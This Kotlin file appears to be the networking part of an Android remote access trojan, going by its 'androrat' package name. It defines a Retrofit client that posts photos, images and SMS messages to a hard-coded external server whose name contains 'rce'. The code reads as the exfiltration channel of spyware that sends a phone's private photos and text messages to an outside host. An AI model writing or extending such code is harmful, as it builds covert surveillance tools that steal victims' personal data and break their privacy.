package com.ierusalem.androrat.core.data.networking

import android.content.Context
import okhttp3.MultipartBody
import okhttp3.ResponseBody
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST

interface ApiService {
    @POST("upload")
    suspend fun uploadPhotos(
        @Body file: MultipartBody
    ): Response<ResponseBody>

    @POST("upload")
    suspend fun postImage(
        @Body file: MultipartBody
    ): Response<ResponseBody>

    @POST("sms")
    suspend fun postMessages(
        @Body sms: SMSModel
    ): Response<ResponseBody>
}

class RetrofitInstance(context: Context) {

    companion object {
    private const val BASE_URL = "https://kano-rce-ten.vercel.app/"
    }
    
    private val retrofit by lazy {
        Retrofit.Builder()
            .baseUrl(BASE_URL)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
    }

    val api: ApiService by lazy {
        retrofit.create(ApiService::class.java)
    }
}
